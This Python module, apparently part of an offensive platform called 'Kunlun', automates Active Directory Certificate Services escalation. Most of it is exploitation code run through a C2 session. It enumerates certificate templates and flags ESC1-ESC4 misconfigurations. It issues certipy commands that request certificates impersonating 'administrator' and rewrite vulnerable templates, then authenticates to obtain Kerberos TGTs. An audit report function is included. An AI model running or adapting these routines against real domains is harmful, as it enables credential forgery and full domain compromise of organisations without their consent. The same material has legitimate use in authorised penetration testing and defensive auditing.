"""ADCS (Active Directory Certificate Services) escalation module for Kunlun platform.

Provides:
- ESC1-ESC13 vulnerability detection and exploitation
- Certificate template enumeration and analysis
- Automatic certificate request and TGT acquisition
- Certificate template audit with risk assessment
"""

import asyncio
import logging
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


class ESCVulnerability(Enum):
    """ADCS ESC vulnerability types."""
    ESC1 = "esc1"
    ESC2 = "esc2"
    ESC3 = "esc3"
    ESC4 = "esc4"
    ESC5 = "esc5"
    ESC6 = "esc6"
    ESC7 = "esc7"
    ESC8 = "esc8"
    ESC9 = "esc9"
    ESC10 = "esc10"
    ESC11 = "esc11"
    ESC12 = "esc12"
    ESC13 = "esc13"


@dataclass
class CertificateTemplate:
    """ADCS certificate template information.

    Attributes:
        name: Template name
        display_name: Display name
        enrollment_flag: Enrollment flags
        certificate_name_flag: Certificate name flags
        eku: Extended Key Usages
        enrollment_permissions: Users/groups with enrollment rights
        has_vulnerability: Whether template has vulnerability
        vulnerability_type: Type of vulnerability
        vulnerability_details: Vulnerability details
        is_exploitable: Whether template is exploitable
    """
    name: str = ""
    display_name: str = ""
    enrollment_flag: str = ""
    certificate_name_flag: str = ""
    eku: List[str] = field(default_factory=list)
    enrollment_permissions: List[str] = field(default_factory=list)
    has_vulnerability: bool = False
    vulnerability_type: str = ""
    vulnerability_details: str = ""
    is_exploitable: bool = False

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary."""
        return {
            "name": self.name,
            "display_name": self.display_name,
            "enrollment_flag": self.enrollment_flag,
            "certificate_name_flag": self.certificate_name_flag,
            "eku": self.eku,
            "enrollment_permissions": self.enrollment_permissions,
            "has_vulnerability": self.has_vulnerability,
            "vulnerability_type": self.vulnerability_type,
            "is_exploitable": self.is_exploitable,
        }


@dataclass
class ADCSExploitationResult:
    """Result of ADCS exploitation.

    Attributes:
        success: Whether exploitation succeeded
        vulnerability_type: Exploited vulnerability type
        certificate_data: Certificate data (base64)
        certificate_path: Certificate file path
        tgt_obtained: Whether TGT was obtained
        tgt_data: TGT ticket data
        error_message: Error message if failed
        attck_technique: Associated ATT&CK technique ID
        duration_seconds: Operation duration
    """
    success: bool = False
    vulnerability_type: str = ""
    certificate_data: str = ""
    certificate_path: str = ""
    tgt_obtained: bool = False
    tgt_data: str = ""
    error_message: str = ""
    attck_technique: str = "T1558.004"
    duration_seconds: float = 0.0


@dataclass
class ADCSAuditResult:
    """Result of ADCS template audit.

    Attributes:
        total_templates: Total number of templates
        vulnerable_templates: Number of vulnerable templates
        exploitable_templates: Number of exploitable templates
        templates: List of certificate templates
        high_risk_templates: List of high-risk template names
        audit_report: Audit report text
        duration_seconds: Audit duration
    """
    total_templates: int = 0
    vulnerable_templates: int = 0
    exploitable_templates: int = 0
    templates: List[CertificateTemplate] = field(default_factory=list)
    high_risk_templates: List[str] = field(default_factory=list)
    audit_report: str = ""
    duration_seconds: float = 0.0


class ADCSEscalation:
    """ADCS escalation module.

    Provides ESC1-ESC13 detection and exploitation, certificate template
    enumeration, and audit capabilities.
    """

    ESC_VULNERABILITY_MAP: Dict[str, str] = {
        "ESC1": "宽松注册权限+客户端认证EKU+可指定SAN",
        "ESC2": "宽松注册权限+任何目的EKU",
        "ESC3": "宽松注册权限+证书请求代理EKU",
        "ESC4": "模板ACL配置错误（可修改模板）",
        "ESC5": "PKI对象ACL配置错误",
        "ESC6": "CA权限配置错误（EDITF_ATTRIBUTESUBJECTALTNAME2）",
        "ESC7": "CA管理权限不足（ManageCA/ManageCertificates）",
        "ESC8": "HTTP端点NTLM中继风险",
        "ESC9": "No Security Extension + 弱映射",
        "ESC10": "弱证书映射 + 无SAN要求",
        "ESC11": "ICPR中继风险（IF_ENFORCEENCRYPTICERTREQUEST未设置）",
        "ESC12": "CA中继风险（ICertRequest2::Submit）",
        "ESC13": "宽松注册权限+客户端认证EKU+弱映射",
    }

    def __init__(
        self,
        c2_session: Optional[Any] = None,
        credential_db: Optional[Any] = None,
        event_bus: Optional[Any] = None,
    ) -> None:
        """Initialize ADCS escalation module.

        Args:
            c2_session: C2 framework session for command execution.
            credential_db: Credential database for storing results.
            event_bus: Event bus for broadcasting events.
        """
        self.c2_session = c2_session
        self.credential_db = credential_db
        self.event_bus = event_bus
        self._progress_callback: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None
        self._log_callback: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None
        self._discovered_templates: List[CertificateTemplate] = []

    def set_callbacks(
        self,
        progress_cb: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None,
        log_cb: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None,
    ) -> None:
        """Set progress and log callbacks.

        Args:
            progress_cb: Callback for progress updates (message, percentage).
            log_cb: Callback for log messages.
        """
        self._progress_callback = progress_cb
        self._log_callback = log_cb

    async def _report_progress(self, message: str, percentage: float) -> None:
        """Report progress via callback.

        Args:
            message: Progress message.
            percentage: Progress percentage (0-100).
        """
        if self._progress_callback:
            await self._progress_callback(message, percentage)
        logger.info("ADCS Progress: %.1f%% - %s", percentage, message)

    async def _report_log(self, message: str) -> None:
        """Report log via callback.

        Args:
            message: Log message.
        """
        if self._log_callback:
            await self._log_callback(message)
        logger.info("ADCS: %s", message)

    async def _execute_command(self, command: str, target: str = "") -> Dict[str, Any]:
        """Execute command via C2 session.

        Args:
            command: Command to execute.
            target: Target host.

        Returns:
            Command execution result.
        """
        if self.c2_session:
            try:
                result = await self.c2_session.execute(command, target=target)
                return {"success": True, "output": result}
            except Exception as e:
                return {"success": False, "error": str(e)}
        return {"success": False, "error": "No C2 session available"}

    async def enumerate_templates(self) -> List[CertificateTemplate]:
        """Enumerate all certificate templates.

        Returns:
            List of certificate templates.
        """
        templates: List[CertificateTemplate] = []

        try:
            await self._report_progress("枚举证书模板", 10)
            await self._report_log("开始枚举ADCS证书模板...")

            cmd = (
                "Get-ADObject -LDAPFilter \"(objectClass=pKICertificateTemplate)\" "
                "-SearchBase \"CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=com\" "
                "-Properties displayName, msPKI-Certificate-Name-Flag, "
                "msPKI-Enrollment-Flag, pKIExtendedKeyUsage, nTSecurityDescriptor"
            )
            result = await self._execute_command(cmd)

            if result.get("success"):
                output = str(result.get("output", ""))
                templates = self._parse_templates(output)

                for template in templates:
                    vuln = self._check_vulnerability(template)
                    if vuln:
                        template.has_vulnerability = True
                        template.vulnerability_type = vuln
                        template.vulnerability_details = self.ESC_VULNERABILITY_MAP.get(vuln, "")
                        template.is_exploitable = self._is_exploitable(template, vuln)

            self._discovered_templates = templates

            vuln_count = sum(1 for t in templates if t.has_vulnerability)
            exploit_count = sum(1 for t in templates if t.is_exploitable)

            await self._report_progress(
                f"发现 {len(templates)} 个模板, {vuln_count} 个存在漏洞, {exploit_count} 个可利用",
                100,
            )

        except Exception as e:
            logger.error("Template enumeration failed: %s", e)
            await self._report_log(f"证书模板枚举失败: {e}")

        return templates

    def _parse_templates(self, output: str) -> List[CertificateTemplate]:
        """Parse certificate templates from command output.

        Args:
            output: Command output.

        Returns:
            List of parsed templates.
        """
        templates: List[CertificateTemplate] = []
        current: Optional[Dict[str, str]] = None

        for line in output.split("\n"):
            line = line.strip()
            if not line:
                if current:
                    template = self._build_template(current)
                    if template:
                        templates.append(template)
                    current = None
                continue

            if ":" in line:
                key, _, value = line.partition(":")
                key = key.strip().lower()
                value = value.strip()

                if current is None:
                    current = {}
                current[key] = value

        if current:
            template = self._build_template(current)
            if template:
                templates.append(template)

        return templates

    def _build_template(self, data: Dict[str, str]) -> Optional[CertificateTemplate]:
        """Build CertificateTemplate from parsed data.

        Args:
            data: Parsed template data.

        Returns:
            CertificateTemplate or None.
        """
        try:
            template = CertificateTemplate()
            template.name = data.get("name", data.get("cn", ""))
            template.display_name = data.get("displayname", "")
            template.enrollment_flag = data.get("mspki-enrollment-flag", "")
            template.certificate_name_flag = data.get("mspki-certificate-name-flag", "")

            eku_str = data.get("pkiextendedkeyusage", "")
            if eku_str:
                template.eku = [e.strip() for e in eku_str.split(",") if e.strip()]

            return template
        except Exception as e:
            logger.error("Failed to build template: %s", e)
            return None

    def _check_vulnerability(self, template: CertificateTemplate) -> str:
        """Check template for ESC vulnerabilities.

        Args:
            template: Certificate template.

        Returns:
            Vulnerability type or empty string.
        """
        eku_lower = [e.lower() for e in template.eku]
        name_flag = template.certificate_name_flag.lower()
        enrollment_flag = template.enrollment_flag.lower()

        has_client_auth = any("client authentication" in e or "1.3.6.1.5.5.7.3.2" in e for e in eku_lower)
        has_any_purpose = any("any purpose" in e or "2.5.29.37.0" in e for e in eku_lower)
        has_cert_request_agent = any("certificate request agent" in e or "1.3.6.1.4.1.311.20.2.1" in e for e in eku_lower)
        can_enroll = "enrollee_supplies_subject" in name_flag or "ct_flag_enrollee_supplies_subject" in name_flag

        if has_client_auth and can_enroll:
            return "ESC1"
        if has_any_purpose and can_enroll:
            return "ESC2"
        if has_cert_request_agent:
            return "ESC3"
        if "write" in template.enrollment_flag.lower() or "fullcontrol" in template.enrollment_flag.lower():
            return "ESC4"

        return ""

    def _is_exploitable(self, template: CertificateTemplate, vuln_type: str) -> bool:
        """Check if template is exploitable.

        Args:
            template: Certificate template.
            vuln_type: Vulnerability type.

        Returns:
            True if exploitable.
        """
        if vuln_type in ("ESC1", "ESC2", "ESC3"):
            return True
        if vuln_type == "ESC4":
            return True
        return False

    async def exploit_esc1(
        self,
        template_name: str,
        target_user: str = "administrator",
        target_domain: str = "",
    ) -> ADCSExploitationResult:
        """Exploit ESC1 vulnerability.

        Args:
            template_name: Vulnerable template name.
            target_user: Target user for SAN.
            target_domain: Target domain.

        Returns:
            ADCSExploitationResult.
        """
        start_time = time.time()
        result = ADCSExploitationResult(vulnerability_type="ESC1")

        try:
            await self._report_progress("利用ESC1漏洞", 10)
            await self._report_log(f"开始ESC1利用: 模板={template_name}, 目标={target_user}")

            await self._report_progress("申请证书", 30)

            cert_cmd = (
                f"certipy req -ca 'CA-NAME' -template {template_name} "
                f"-target {target_domain} "
                f"-upn {target_user}@{target_domain} "
                f"-dc-ip {target_domain}"
            )
            cert_result = await self._execute_command(cert_cmd)

            if not cert_result.get("success"):
                result.error_message = "证书申请失败"
                result.duration_seconds = time.time() - start_time
                return result

            output = str(cert_result.get("output", ""))
            cert_path = ""
            for line in output.split("\n"):
                if "saved to" in line.lower() or "certificate" in line.lower():
                    cert_path = line.split(":")[-1].strip() if ":" in line else line.strip()

            result.certificate_path = cert_path
            result.certificate_data = cert_path

            await self._report_progress("获取TGT", 70)
            await self._report_log("证书申请成功，尝试获取TGT...")

            tgt_result = await self._authenticate_with_certificate(cert_path, target_user, target_domain)
            if tgt_result.get("success"):
                result.tgt_obtained = True
                result.tgt_data = tgt_result.get("ticket", "")
                result.success = True
                await self._report_log("TGT获取成功")
            else:
                result.success = True
                await self._report_log("证书获取成功，但TGT获取失败")

            result.duration_seconds = time.time() - start_time
            await self._report_progress("完成", 100)

        except Exception as e:
            result.error_message = str(e)
            result.duration_seconds = time.time() - start_time
            await self._report_log(f"ESC1利用失败: {e}")
            logger.error("ESC1 exploitation failed: %s", e)

        return result

    async def exploit_esc4(
        self,
        template_name: str,
        target_user: str = "administrator",
        target_domain: str = "",
    ) -> ADCSExploitationResult:
        """Exploit ESC4 vulnerability.

        Args:
            template_name: Vulnerable template name.
            target_user: Target user for SAN.
            target_domain: Target domain.

        Returns:
            ADCSExploitationResult.
        """
        start_time = time.time()
        result = ADCSExploitationResult(vulnerability_type="ESC4")

        try:
            await self._report_progress("利用ESC4漏洞", 10)
            await self._report_log(f"开始ESC4利用: 模板={template_name}")

            await self._report_progress("修改模板配置", 30)
            await self._report_log("修改模板配置使其可利用...")

            modify_cmd = (
                f"certipy template -ca 'CA-NAME' -template {template_name} "
                f"-save-old -target {target_domain}"
            )
            modify_result = await self._execute_command(modify_cmd)

            if not modify_result.get("success"):
                result.error_message = "模板修改失败"
                result.duration_seconds = time.time() - start_time
                return result

            await self._report_progress("申请证书", 60)
            await self._report_log("模板修改成功，申请证书...")

            esc1_result = await self.exploit_esc1(template_name, target_user, target_domain)
            result.success = esc1_result.success
            result.certificate_data = esc1_result.certificate_data
            result.certificate_path = esc1_result.certificate_path
            result.tgt_obtained = esc1_result.tgt_obtained
            result.tgt_data = esc1_result.tgt_data

            result.duration_seconds = time.time() - start_time
            await self._report_progress("完成", 100)

        except Exception as e:
            result.error_message = str(e)
            result.duration_seconds = time.time() - start_time
            await self._report_log(f"ESC4利用失败: {e}")
            logger.error("ESC4 exploitation failed: %s", e)

        return result

    async def _authenticate_with_certificate(
        self,
        cert_path: str,
        target_user: str,
        target_domain: str,
    ) -> Dict[str, Any]:
        """Authenticate using certificate to get TGT.

        Args:
            cert_path: Certificate file path.
            target_user: Target username.
            target_domain: Target domain.

        Returns:
            Authentication result.
        """
        try:
            cmd = (
                f"certipy auth -pfx {cert_path} "
                f"-dc-ip {target_domain}"
            )
            result = await self._execute_command(cmd)
            if result.get("success"):
                output = str(result.get("output", ""))
                ticket = ""
                for line in output.split("\n"):
                    if "ticket" in line.lower() or "tgt" in line.lower():
                        ticket = line.split(":")[-1].strip() if ":" in line else line.strip()
                return {"success": True, "ticket": ticket}
            return {"success": False, "error": "Certificate authentication failed"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    async def audit_templates(self) -> ADCSAuditResult:
        """Audit all certificate templates.

        Returns:
            ADCSAuditResult with audit findings.
        """
        start_time = time.time()
        audit = ADCSAuditResult()

        try:
            await self._report_progress("审计证书模板", 10)
            await self._report_log("开始ADCS证书模板审计...")

            templates = await self.enumerate_templates()
            audit.templates = templates
            audit.total_templates = len(templates)
            audit.vulnerable_templates = sum(1 for t in templates if t.has_vulnerability)
            audit.exploitable_templates = sum(1 for t in templates if t.is_exploitable)
            audit.high_risk_templates = [t.name for t in templates if t.is_exploitable]

            report_lines = [
                "ADCS Certificate Template Audit Report",
                "=" * 50,
                f"Total Templates: {audit.total_templates}",
                f"Vulnerable Templates: {audit.vulnerable_templates}",
                f"Exploitable Templates: {audit.exploitable_templates}",
                "",
                "High-Risk Templates:",
            ]
            for name in audit.high_risk_templates:
                report_lines.append(f"  - {name}")

            report_lines.extend(["", "Detailed Findings:", "-" * 30])
            for template in templates:
                if template.has_vulnerability:
                    report_lines.extend([
                        f"Template: {template.name}",
                        f"  Vulnerability: {template.vulnerability_type}",
                        f"  Details: {template.vulnerability_details}",
                        f"  Exploitable: {template.is_exploitable}",
                        "",
                    ])

            audit.audit_report = "\n".join(report_lines)
            audit.duration_seconds = time.time() - start_time

            await self._report_progress("审计完成", 100)
            await self._report_log(f"审计完成: {audit.total_templates} 个模板, {audit.vulnerable_templates} 个存在漏洞")

        except Exception as e:
            logger.error("Template audit failed: %s", e)
            audit.audit_report = f"Audit failed: {e}"

        return audit
